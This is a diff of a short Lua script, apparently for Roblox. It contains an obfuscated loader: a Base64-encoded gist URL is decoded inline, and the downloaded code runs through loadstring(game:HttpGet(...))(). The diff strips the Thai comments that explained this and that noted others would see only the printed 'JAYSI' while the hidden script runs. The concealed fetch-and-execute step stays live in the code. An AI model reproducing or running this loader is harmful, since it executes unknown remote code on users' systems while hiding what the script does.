@@ -1,9 +1,9 @@
--- ฟังก์ชัน JAYSI() เป็นตัวรันสคริปต์
+
 function JAYSI()
-    -- URL จริงเข้ารหัส Base64
+    
     local encoded = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbGFyOTIwODUtYmVlcC80MjM2YTI0ZTNjOTliZWI3ZGZiMTZhMDdjYWZlZTVmNy9yYXcv"
     
-    -- ฟังก์ชัน decode Base64
+
     local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     local decoded = (encoded:gsub('.', function(x)
         if x == '=' then return '' end
@@ -16,9 +16,8 @@ function JAYSI()
         return string.char(c)
     end))
     
-    -- โหลดสคริปต์จริง
+
     loadstring(game:HttpGet(decoded))()
 end
 
--- คนอื่นเห็นแค่ข้อความนี้ แต่สามารถรันได้
-print("JAYSI")   -- แสดงข้อความให้เห็น
+print("JAYSI")
